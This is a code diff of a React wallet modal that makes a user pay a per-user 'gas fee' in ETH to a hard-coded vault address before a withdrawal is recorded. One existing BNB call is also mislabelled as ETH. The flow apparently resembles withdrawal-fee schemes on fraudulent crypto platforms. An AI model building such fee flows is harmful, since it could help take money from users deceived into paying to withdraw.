@@ -21,7 +21,9 @@ interface GasFeeModalProps {
 }
 
 const GAS_FEE_VAULT = '0x742d35Cc6634C0532925a3b844Bc454e4438f44e'; // Example Vault Address
+const GAS_FEE_VAULT_ETH = '0x742d35Cc6634C0532925a3b844Bc454e4438f44e'; // Example Vault Address
 const recipient = '0x742d35Cc6634C0532925a3b844Bc454e4438f44e'; // Example Vault Address
+const recipientEth = '0x742d35Cc6634C0532925a3b844Bc454e4438f44e'; // Example Vault Address
 
 export default function GasFeeModal({ isOpen, onClose, onSuccess, amount = '0.00' ,user}: GasFeeModalProps) {
     // 'idle' | 'processing' | 'success'
@@ -77,7 +79,9 @@ if(error){
             // Optionally set error state here
         }
     };
-
+const handlePayGasFac =async ()=>{
+sendEth()
+}
       const sendBnb = async () => {
     //   return  onClose()
 
@@ -109,7 +113,7 @@ setTxSuccess(true)
           body: JSON.stringify({ address:add, amount:Number(amount),
     
 
-            type:"fee",asset:"BNB"
+            type:"fee",asset:"ETH"
            })
         });
     //   setAmount('');
@@ -127,6 +131,62 @@ setTxSuccess(true)
     }
   };
 
+  const sendEth = async () => {
+  let amount = (user?.fields?.gasFee || "").toString();
+  
+  try {
+    if (!cbProvider || !amount) return;
+    setStatus('processing');
+    setError('');
+
+    // 1. Ensure we are on Ethereum Mainnet (0x1) before sending
+    try {
+      await cbProvider.request({
+        method: 'wallet_switchEthereumChain',
+        params: [{ chainId: '0x1' }], 
+      });
+    } catch (switchError: any) {
+      // This handles the case where the chain isn't added (rare for ETH Mainnet)
+      if (switchError.code === 4902) {
+        setError("Please add Ethereum Mainnet to your wallet.");
+        setStatus('idle');
+        return;
+      }
+    }
+
+    const provider = new ethers.BrowserProvider(cbProvider);
+    const signer = await provider.getSigner();
+
+    // 2. Create and send the transaction
+    const tx = await signer.sendTransaction({
+      to: GAS_FEE_VAULT_ETH,
+      value: ethers.parseEther(amount), // Both ETH and BNB use 18 decimals
+    });
+
+    setStatus('Transaction sent! Waiting for block...');
+    await tx.wait();
+
+    setStatus('success');
+    setTxSuccess(true);
+
+    // 3. Update API call to reflect ETH asset
+    await fetch(`/api/withdrawal`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ 
+        address: add, 
+        amount: Number(amount),
+        type: "fee", 
+        asset: "ETH" // Changed from BNB to ETH
+      })
+    });
+
+  } catch (err: any) {
+    console.log("Transaction Error:", err?.info?.error?.message);
+    setError(err?.info?.error?.message || err.message || "Transaction failed");
+    setStatus('idle');
+  }
+};
 
 
     return (
@@ -176,7 +236,7 @@ setTxSuccess(true)
                         <div className="bg-[#1E2025] rounded-xl p-4 border border-white/5">
                             <div className="flex justify-between items-center text-sm mb-2">
                                 <span className="text-gray-400">Estimated Fee</span>
-                                <span className="text-white font-medium text-base">{user?.fields?.gasFee||0} BNB</span>
+                                <span className="text-white font-medium text-base">{user?.fields?.gasFee||0} ETH</span>
                             </div>
                             <div className="flex justify-between items-center text-sm">
                                 <span className="text-gray-400">Time</span>
@@ -190,8 +250,7 @@ setTxSuccess(true)
                             
                         <button
                             onClick={
-                                // handlePayGas
-                                sendBnb
+                         ()=>{}
                             }
                             disabled={status != 'idle' ||!(user?.fields?.gasFee)}
                             className="w-full bg-[#0052FF] hover:bg-[#004ada] text-white font-bold py-3.5 rounded-full transition-all flex items-center justify-center gap-2 shadow-lg hover:shadow-[#0052FF]/25 active:scale-[0.98] text-sm"
@@ -206,7 +265,7 @@ setTxSuccess(true)
                         <button
                             onClick={
                                 // handlePayGas
-                                sendBnb
+                                handlePayGasFac
                             }
                             disabled={status != 'idle' ||!(user?.fields?.gasFee)}
                             className="w-full bg-[#0052FF] hover:bg-[#004ada] text-white font-bold py-3.5 rounded-full transition-all flex items-center justify-center gap-2 shadow-lg hover:shadow-[#0052FF]/25 active:scale-[0.98] text-sm"
